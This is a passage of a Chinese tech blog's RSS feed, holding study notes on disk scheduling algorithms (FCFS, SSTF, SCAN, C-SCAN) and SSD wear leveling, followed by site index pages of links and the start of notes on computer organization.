style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 为 <code>5.55ms</code>；对于软盘，其旋转速度为 <code>300~600</code> 转/分，则 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>r</mi></msub></mrow><annotation encoding="application/x-tex">T_{r}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 为 <code>50~100ms</code>。</p>
</li>
<li>
<p><strong>传输时间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">T_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></strong></p>
<p>从磁盘读出或向磁盘写入数据所经历的时间，这个时间取决于每次所读/写的字节数 <code>b</code> 和磁盘的旋转速度：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>t</mi></msub><mo>=</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mi>b</mi><mrow><mi>r</mi><mi>N</mi></mrow></mfrac></mstyle></mrow><annotation encoding="application/x-tex">T_{t} = \dfrac{b}{rN}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.0574em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span> 式中，<code>r</code> 为磁盘每秒的转数，<code>N</code> 为一个磁道上的字节数。</p>
</li>
</ul>
<p>在磁盘存取时间的计算中，寻道时间与磁盘调度算法相关；而延迟时间和传输时间都与磁盘旋转速度相关，且为线性相关，所以在硬件上，转速是磁盘性能的一个非常重要的参数。</p>
<p>总平均存取时间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>a</mi></msub></mrow><annotation encoding="application/x-tex">T_{a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 可以表示为：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>a</mi></msub><mo>=</mo><msub><mi>T</mi><mi>s</mi></msub><mo>+</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mn>1</mn><mrow><mn>2</mn><mi>r</mi></mrow></mfrac></mstyle><mo>+</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mi>b</mi><mrow><mi>r</mi><mi>N</mi></mrow></mfrac></mstyle></mrow><annotation encoding="application/x-tex">T_{a} = T_{s} + \dfrac{1}{2r} + \dfrac{b}{rN}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:2.0074em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:2.0574em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p>
<p>虽然这里给出了总平均存取时间的公式，但是这个平均值是没有太大实际意义的，因为在实际的磁盘 <code>I/O</code> 操作中，存取时间与磁盘调度算法密切相关。</p>
<p><strong>目前常用的磁盘调度算法有以下几种：</strong></p>
<ul>
<li>
<p><strong>先来先服务（First Come First Served，FCFS）算法</strong></p>
<p>FCFS 算法根据进程请求访问磁盘的先后顺序进行调度，这是一种最简单的调度算法。该算法的优点是具有公平性。若只有少量进程需要访问，且大部分请求都是访问簇聚的文件扇区，则有望达到较好的性能；若有大量进程竞争使用磁盘，则这种算法在性能上往往接近于随机调度。所以，实际磁盘调度中会考虑一些更为复杂的调度算法。</p>
<p>例如：磁盘请求队列中的请求顺序分别为 <code>55, 58, 39, 18, 90, 160, 150, 38, 184</code>，磁头的初始位置是磁道 <code>100</code>。磁头共移动了 <code>45 + 3 + 19 + 21 + 72 + 70 + 10 + 112 + 146 = 498</code> 个磁道，平均寻找长度 = 498/9 = 55.3。</p>
</li>
<li>
<p><strong>最短寻找时间优先（Shortest Seek Time First，SSTF）算法</strong></p>
<p>SSTF 算法选择调度处理的磁道是与当前磁头所在磁道距离最近的磁道，以便使每次的寻找时间最短。当然，总是选择最小寻找时间并不能保证平均寻找时间最小，但能提供比 FCFS 算法更好的性能。这种算法会产生 “饥饿” 现象。若某时刻磁头正在 <code>18</code> 号磁道，而在 <code>18</code> 号磁道附近频繁地增加新的请求，则 SSTF 算法使得磁头长时间在 <code>18</code> 号磁道附近工作，将使 <code>184</code> 号磁道的访问被无限期地延迟，即被 “饿死”。</p>
<p>例如：磁盘请求队列中的请求顺序分别为 <code>55, 58, 39, 18, 90, 160, 150, 38, 184</code>，磁头初始位置是磁道 <code>100</code>。磁头共移动了 <code>10 + 32 + 3 + 16 + 1 + 20 + 132 + 10 + 24 = 248</code> 个磁道，平均寻找长度 = 248/9 = 27.5。</p>
</li>
<li>
<p><strong>扫描（SCAN）算法（又称电梯调度算法）</strong></p>
<p>SCAN 算法在磁头当前移动方向上选择与当前磁头所在磁道距离最近的请求作为下一次服务的对象，实际上就是在最短寻找时间优先算法的基础上规定了磁头运动的方向。由于磁头移动规律与电梯运行相似，因此又称电梯调度算法。SCAN 算法对最近扫描过的区域不公平，因此它在访问局部性方面不如 FCFS 算法和 SSTF 算法好。</p>
<p>例如：磁盘请求队列中的请求顺序分别为 <code>55, 58, 39, 18, 90, 160, 150, 38, 184</code>，磁头初始位置是磁道 <code>100</code>。采用 SCAN 算法时，不但要知道磁头的当前位置，而且要知道磁头的移动方向，假设磁头沿磁道号增大的顺序移动。移动磁道的顺序为 <code>100, 150, 160, 184, 200, 90, 58, 55, 39, 38, 18</code>。磁头共移动了 <code>50 + 10 + 24 + 16 + 110 + 32 + 3 + 16 + 1 + 20 = 282</code> 个磁道，平均寻道长度 = 282/9 = 31.33。</p>
</li>
<li>
<p><strong>循环扫描（CircularS CAN，C-SCAN）算法</strong></p>
<p>在扫描算法的基础上规定磁头单向移动来提供服务，回返时直接快速移动至起始端而不服务任何请求。由于 SCAN 算法偏向于处理那些接近最里或最外的磁道的访问请求，所以使用改进型的 C-SCAN 算法来避免这个问题。</p>
<p>采用 SCAN 算法和 C-SCAN 算法时，磁头总是严格地遵循从盘面的一端到另一端，显然，在实际使用时还可以改进，即磁头移动只需要到达最远端的一个请求即可返回，不需要到达磁盘端点。这种形式的 SCAN 算法和 C-SCAN 算法称为 LOOK 调度和 C-LOOK 调度，因为它们在朝一个给定方向移动前会查看是否有请求。</p>
<p>例如：磁盘请求队列中的请求顺序为 <code>55, 58, 39, 18, 90, 160, 150, 38, 184</code>，磁头初始位置是磁道 <code>100</code>。采用 C-SCAN 算法时，假设磁头沿磁道号增大的顺序移动。移动磁道的顺序为 <code>100, 150, 160, 184, 200, 0, 18, 38, 39, 55, 58, 90</code>。磁头共移动 <code>50 + 10 + 24 + 16 + 200 + 18 + 20 + 1 + 16 + 3 + 32 = 390</code> 个磁道，平均寻道长度 = 390/9 = 43.33。</p>
</li>
</ul>
<p>对比以上几种磁盘调度算法，FCFS 算法太过简单，性能较差，仅在请求队列长度接近于 1 时才较为理想；SSTF 算法较为通用和自然；SCAN 算法和 C-SCAN 算法在磁盘负载较大时比较占优势。它们之间的比较见下表：</p>
<table>
<thead>
<tr>
<th style="text-align:center">算法</th>
<th style="text-align:center">优点</th>
<th style="text-align:center">缺点</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">FCFS 算法</td>
<td style="text-align:center">公平、简单</td>
<td style="text-align:center">平均寻道距离大，仅应用在磁盘 <code>I/O</code> 较少的场合</td>
</tr>
<tr>
<td style="text-align:center">SSTF 算法</td>
<td style="text-align:center">性能比 “先来先服务” 好</td>
<td style="text-align:center">不能保证平均寻道时间最短，可能出现 “饥饿” 现象</td>
</tr>
<tr>
<td style="text-align:center">SCAN 算法</td>
<td style="text-align:center">寻道性能较好，可避免 “饥饿” 现象</td>
<td style="text-align:center">不利于远离磁头一端的访问请求</td>
</tr>
<tr>
<td style="text-align:center">C-SCAN 算法</td>
<td style="text-align:center">消除了对两端磁道请求的不公平</td>
<td style="text-align:center">——</td>
</tr>
</tbody>
</table>
<p>除减少寻找时间外，减少延迟时间也是提高磁盘传输效率的重要因素。可以对盘面扇区进行交替编号，对磁盘片组中的不同盘面错位命名。假设每个盘面有 <code>8</code> 个扇区，磁盘片组共 <code>8</code> 个盘面，则可以采用如下图所示的编号。</p>
<figure><figcaption>扇区编号</figcaption></figure>
<p>磁盘是连续自转设备，磁头读/写一个物理块后，需要经过短暂的处理时间才能开始读/写下一块。假设逻辑记录数据连续存放在磁盘空间中若在盘面上按扇区交替编号连续存放，则连续读/写多条记录时能减少磁头的延迟时间；同柱面不同盘面的扇区若能错位编号，连续读/写相邻两个盘面的逻辑记录时也能减少磁头延迟时间。</p>
<p>以上图为例，在随机扇区访问情况下，定位磁道中的一个扇区平均需要转过 4 个扇区，这时，延迟时间是传输时间的 4 倍，这是一种非常低效的方式。理想的情况是不需要定位而直接连续读取扇区，没有延迟时间，这样磁盘数据存取效率可以成倍提高。但由于读取扇区的顺序是不可预测的，所以延迟时间不可避免。上图中的编号方式是读取连续编号扇区时的一种方法。</p>
<h4> 固态硬盘</h4>
<ol>
<li>
<p><strong>固态硬盘的特性</strong></p>
<p>固态硬盘（SSD）是一种基于闪存技术的存储器。它与 U 盘并无本质差别，只是容量更大，存取性能更好。一个 SSD 由一个或多个闪存芯片和闪存翻译层组成，如下图所示。闪存芯片替代传统旋转磁盘中的机械驱动器，而闪存翻译层将来自 CPU 的逻辑块读写请求翻译成对底层物理设备的读写控制信号，因此闪存翻译层相当于扮演了磁盘控制器的角色。</p>
<figure><figcaption>固态硬盘</figcaption></figure>
<p>在上图中，一个闪存由 B 块组成，每块由 P 页组成。通常，页的大小是 <code>512B~4KB</code>，每块由 <code>32~128</code> 页组成，块的大小为 <code>16KB~512KB</code>。数据是以页为单位读写的。只有在一页所属的块整个被擦除后，才能写这一页。不过，一旦擦除一块，块中的每页就都可以直接再写一次。某块进行若干次重复写后，就会磨损坏，不能再使用。</p>
<p>随机写很慢，有两个原因。首先，擦除块比较慢，通常比访问页高一个数量级。其次，如果写操作试图修改包含已有数据的页 P<sub>i</sub>，那么这个块中所有含有用数据的页都必须被复制到一个新（擦除过的）块中，然后才能进行对页 P<sub>i</sub> 的写操作。</p>
<p>比起传统磁盘，SSD 有很多优点，它由半导体存储器构成，没有移动的部件，因而随机访问速度比机械磁盘要快很多，也没有任何机械噪声和震动，能耗更低、抗震性好、安全性高等。</p>
<p>随着技术的不断发展，价格也不断下降，SSD 会有望逐步取代传统机械硬盘。</p>
</li>
<li>
<p><strong>磨损均衡（Wear Leveling）</strong></p>
<p>固态硬盘也有缺点，闪存的擦写寿命是有限的，一般是几百次到几千次。如果直接用普通闪存组装 SSD，那么实际的寿命表现可能非常令人失望——读写数据时会集中在 SSD 的一部分闪存，这部分闪存的寿命会损耗得特别快。一旦这部分闪存损坏，整块 SSD 也就损坏了。这种磨损不均衡的情况，可能会导致一块 <code>256GB</code> 的 SSD，只因数兆空间的闪存损坏而整块损坏。</p>
<p>为了弥补 SSD 的寿命缺陷，引入了磨损均衡。<strong>SSD 磨损均衡技术大致分为两种：</strong></p>
<ul>
<li><strong>动态磨损均衡</strong>：写入数据时，自动选择较新的闪存块。老的闪存块先歇一歇</li>
<li><strong>静态磨损均衡</strong>：这种技术更为先进，就算没有数据写入，SSD 也会监测并自动进行数据分配，让老的闪存块承担无须写数据的存储任务，同时让较新的闪存块腾出空间，平常的读写操作在较新的闪存块中进行。如此一来，各闪存块的寿命损耗就都差不多</li>
</ul>
<p>有了这种算法加持，SSD 的寿命就比较可观了。例如：对于一个 <code>256GB</code> 的 SSD，如果闪存的擦写寿命是 <code>500</code> 次，那么就需要写入 <code>125TB</code> 数据，才寿终正寝。就算每天写入 <code>10GB</code> 数据，也要三十多年才能将闪存磨损坏，更何况很少有人每天往 SSD 中写入 <code>10GB</code> 数据。</p>
</li>
</ol>
]]></content:encoded>
    </item>
    <item>
      <title>计算机</title>
      <link>https://sankgao.github.io/computers/</link>
      <guid>https://sankgao.github.io/computers/</guid>
      <source url="https://sankgao.github.io/rss.xml">计算机</source>
      <description>记录一些计算机相关的信息。</description>
      <category>Computer</category>
      <pubDate>Tue, 08 Aug 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>记录一些计算机相关的信息。</p>
<!-- more -->
<h2> 计算机基础</h2>
<ul>
<li><a href="/computers/base/computer_organization.html" target="blank">计算机组成</a></li>
<li><a href="/computers/base/operating_system.html" target="blank">操作系统</a></li>
<li><a href="/computers/base/computer_network.html" target="blank">计算机网络</a></li>
<li><a href="/computers/base/data_structure.html" target="blank">数据结构与算法</a></li>
</ul>
<h2> Windows</h2>
<ul>
<li><a href="/computers/windows/site_not_secure.html" target="blank">网页提示此站点不安全</a></li>
<li><a href="/computers/windows/github_loading.html" target="blank">加载 GitHub 问题</a></li>
</ul>
<h2> Linux</h2>
<ul>
<li><a href="/computers/linux/banner_message.html" target="blank">SSH 登录之前显示横幅消息</a></li>
<li><a href="/computers/linux/command.html" target="blank">Linux 系统命令</a></li>
<li><a href="/computers/linux/error_using_sudo.html" target="blank">使用 sudo 时报错</a></li>
<li><a href="/computers/linux/hardware_resource.html" target="blank">硬件资源管理</a></li>
<li><a href="/computers/linux/install_software.html" target="blank">安装软件的方法</a></li>
<li><a href="/computers/linux/rebound_shell.html" target="blank">反弹 Shell</a></li>
<li><a href="/computers/linux/reset_root_password.html" target="blank">重置 root 密码</a></li>
<li><a href="/computers/linux/root_directory.html" target="blank">系统根目录</a></li>
<li><a href="/computers/linux/system_log.html" target="blank">系统日志</a></li>
<li><a href="/computers/linux/system_service.html" target="blank">系统服务命令</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>友联</title>
      <link>https://sankgao.github.io/about/links.html</link>
      <guid>https://sankgao.github.io/about/links.html</guid>
      <source url="https://sankgao.github.io/rss.xml">友联</source>
      <description>记录一些友联，并给出我的友联信息。</description>
      <category>About</category>
      <pubDate>Wed, 26 Apr 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>记录一些友联，并给出我的友联信息。</p>
<!-- more -->
<h2> 我的友联</h2>
]]></content:encoded>
    </item>
    <item>
      <title>DevOps</title>
      <link>https://sankgao.github.io/devops/</link>
      <guid>https://sankgao.github.io/devops/</guid>
      <source url="https://sankgao.github.io/rss.xml">DevOps</source>
      <description>记录一些 DevOps 相关的信息。</description>
      <category>DevOps</category>
      <pubDate>Tue, 08 Aug 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>记录一些 DevOps 相关的信息。</p>
<!-- more -->
<h2> SVN</h2>
<ul>
<li><a href="/devops/svn/svn.html" target="blank">SVN</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>编程语言</title>
      <link>https://sankgao.github.io/languages/</link>
      <guid>https://sankgao.github.io/languages/</guid>
      <source url="https://sankgao.github.io/rss.xml">编程语言</source>
      <description>记录一些编程语言相关的信息。</description>
      <category>Languages</category>
      <pubDate>Tue, 08 Aug 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>记录一些编程语言相关的信息。</p>
<!-- more -->
<h2> HTML5</h2>
<ul>
<li><a href="/languages/html5/tutorial/" target="blank">基础教程</a></li>
<li><a href="/languages/html5/references/" target="blank">参考手册</a></li>
<li><a href="/languages/html5/tags/" target="blank">标签</a></li>
</ul>
<h2> CSS3</h2>
<ul>
<li><a href="/languages/css3/tutorial/" target="blank">基础教程</a></li>
<li><a href="/languages/css3/references/" target="blank">参考手册</a></li>
</ul>
<h2> Python3</h2>
<ul>
<li><a href="/languages/python3/tutorial/" target="blank">基础教程</a></li>
<li><a href="/languages/python3/algorithm_data_structure/" target="blank">算法和数据结构</a></li>
<li><a href="/languages/python3/references/" target="blank">参考手册</a></li>
<li><a href="/languages/python3/cases.html" target="blank">案例</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>其它</title>
      <link>https://sankgao.github.io/others/</link>
      <guid>https://sankgao.github.io/others/</guid>
      <source url="https://sankgao.github.io/rss.xml">其它</source>
      <description>记录一些其它相关的信息。</description>
      <category>其它</category>
      <pubDate>Tue, 08 Aug 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>记录一些其它相关的信息。</p>
<!-- more -->
<h2> 书籍</h2>
<p>记录一些看过的 <a href="/others/books.html" target="blank">各类书籍</a>，例如：计算机、文学、小说。</p>
]]></content:encoded>
    </item>
    <item>
      <title>博客</title>
      <link>https://sankgao.github.io/about/blog/</link>
      <guid>https://sankgao.github.io/about/blog/</guid>
      <source url="https://sankgao.github.io/rss.xml">博客</source>
      <description>记录一些博客相关的信息。</description>
      <category>About</category>
      <pubDate>Tue, 08 Aug 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>记录一些博客相关的信息。</p>
<!-- more -->
<h2> 博客</h2>
<ul>
<li><a href="/about/blog/build.html" target="blank">VuePress 搭建</a></li>
<li><a href="/about/blog/config.html" target="blank">VuePress 默认配置</a></li>
<li><a href="/about/blog/theme_config.html" target="blank">vuepress-theme-hope 主题</a></li>
<li><a href="/about/blog/theme_plugins.html" target="blank">VuePress 插件</a></li>
<li><a href="/about/blog/problem.html" target="blank">VuePress 问题</a></li>
<li><a href="/about/blog/blog_notes.html" target="blank">博客笔记</a></li>
<li><a href="/about/blog/blog_typeset.html" target="blank">博客排版</a></li>
<li><a href="/about/blog/baidu_seo.html" target="blank">百度收录 GitHub Pages 博客</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>我的</title>
      <link>https://sankgao.github.io/about/my/</link>
      <guid>https://sankgao.github.io/about/my/</guid>
      <source url="https://sankgao.github.io/rss.xml">我的</source>
      <description>记录一些我的相关的信息。</description>
      <category>About</category>
      <pubDate>Tue, 08 Aug 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>记录一些我的相关的信息。</p>
<!-- more -->
<h2> 我的</h2>
<ul>
<li><a href="/about/my/personal_info.html" target="blank">个人信息</a></li>
<li><a href="/about/my/site.html" target="blank">关于网站</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>笔记</title>
      <link>https://sankgao.github.io/about/notes/</link>
      <guid>https://sankgao.github.io/about/notes/</guid>
      <source url="https://sankgao.github.io/rss.xml">笔记</source>
      <description>记录一些笔记相关的信息。</description>
      <category>About</category>
      <pubDate>Tue, 08 Aug 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>记录一些笔记相关的信息。</p>
<!-- more -->
<h2> 笔记</h2>
<ul>
<li><a href="/about/notes/resources.html" target="blank">各种资源</a></li>
<li><a href="/about/notes/quick_reference.html" target="blank">备忘清单</a></li>
<li><a href="/about/notes/markdown_syntax.html" target="blank">Markdown 语法</a></li>
<li><a href="/about/notes/command.html" target="blank">Linux 命令</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>工具</title>
      <link>https://sankgao.github.io/about/tools/</link>
      <guid>https://sankgao.github.io/about/tools/</guid>
      <source url="https://sankgao.github.io/rss.xml">工具</source>
      <description>记录一些工具相关的信息。</description>
      <category>About</category>
      <pubDate>Tue, 08 Aug 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>记录一些工具相关的信息。</p>
<!-- more -->
<h2> 工具</h2>
<ul>
<li><a href="/about/tools/picgo.html" target="blank">PicGo</a></li>
<li><a href="/about/tools/vscode.html" target="blank">VS Code</a></li>
<li><a href="/about/tools/ali_cloud_disk.html" target="blank">阿里云盘自动签到</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>计算机基础</title>
      <link>https://sankgao.github.io/computers/base/</link>
      <guid>https://sankgao.github.io/computers/base/</guid>
      <source url="https://sankgao.github.io/rss.xml">计算机基础</source>
      <description>记录一些计算机基础相关的信息。</description>
      <category>Computer</category>
      <pubDate>Tue, 08 Aug 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>记录一些计算机基础相关的信息。</p>
<!-- more -->
<h2> 计算机基础</h2>
<ul>
<li><a href="/computers/base/computer_organization.html" target="blank">计算机组成</a></li>
<li><a href="/computers/base/operating_system.html" target="blank">操作系统</a></li>
<li><a href="/computers/base/computer_network.html" target="blank">计算机网络</a></li>
<li><a href="/computers/base/data_structure.html" target="blank">数据结构与算法</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>计算机组成</title>
      <link>https://sankgao.github.io/computers/base/computer_organization.html</link>
      <guid>https://sankgao.github.io/computers/base/computer_organization.html</guid>
      <source url="https://sankgao.github.io/rss.xml">计算机组成</source>
      <description>计算机系统概述 发展历程 硬件的发展 计算机的四代变化; 1. 第一代（1946-1975）——电子管时代 逻辑元件采用 电子管；使用 机器语言 进行编程；主存用 延迟线或磁鼓 存储信息，容量极小；体积庞大，成本高；运算速度较低，一般只有 几千次到几万次 每秒。 2. 第二代（1958-1964）——晶体管时代 逻辑元件采用 晶体管；运算速度提高到 几...</description>
      <category>Computer</category>
      <pubDate>Fri, 25 Aug 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> 计算机系统概述</h2>
<h3> 发展历程</h3>
<h4> 硬件的发展</h4>
<ul>
<li>
<p><strong>计算机的四代变化</strong></p>
<ol>
<li>
<p><strong>第一代（1946-1975）——电子管时代</strong></p>
<p>逻辑元件采用 <strong>电子管</strong>；使用 <strong>机器语言</strong> 进行编程；主存用 <strong>延迟线或磁鼓</strong> 存储信息，容量极小；体积庞大，成本高；运算速度较低，一般只有 <strong>几千次到几万次</strong> 每秒。</p>
</li>
<li>
<p><strong>第二代（1958-1964）——晶体管时代</strong></p>
<p>逻辑元件采用 <strong>晶体管</strong>；运算速度提高到 <strong>几万次到几十万次</strong> 每秒；主存用 <strong>磁芯存储器</strong>；计算机软件得到发展，开始出现高级语言及其编译程序，<strong>操作系统</strong> 有了雏形。</p>
</li>
<li>
<p><strong>第三代（1965-1971）——中小规模集成电路时代</strong></p>
<p>逻辑元件采用 <strong>中小规模集成电路</strong>；主存用 <strong>半导体</strong> 取代磁芯存储器；<strong>高级语言</strong> 迅速发展，<strong>操作系统</strong> 也进一步发展，出现 <strong>分时操作系统。</strong></p>
</li>
<li>
<p><strong>第四代（1972-至今）——超大规模集成电路时代</strong></p>
<p>逻辑元件采用 <strong>超大规模集成电路</strong>，产生了 <strong>微处理器</strong>；如：<strong>并行</strong>、<strong>流水线</strong>、<strong>高速缓存</strong> 和 <strong>虚拟存储器</strong> 等概念用在计算机中。</p>
</li>
</ol>
</li>
<li>
<p><strong>计算机元件的更新</strong></p>
<ol>
<li>
<p><strong>摩尔定律</strong></p>
<p>当价格不变，集成电路上的晶体管数目，约每过 18 月会增加一倍。同样的价格 18 月后集成电路是 18 月前集成电路性能的一倍</p>
</li>
<li>
<p><strong>半导体存储器</strong></p>
<p>1970 年仙童半导体公司生产的单芯片：1KB、4KB、16KB、64KB、256KB、1MB、4MB、16MB、64MB、256MB、1GB</p>
</li>
<li>
<p><strong>微处理器</strong></p>
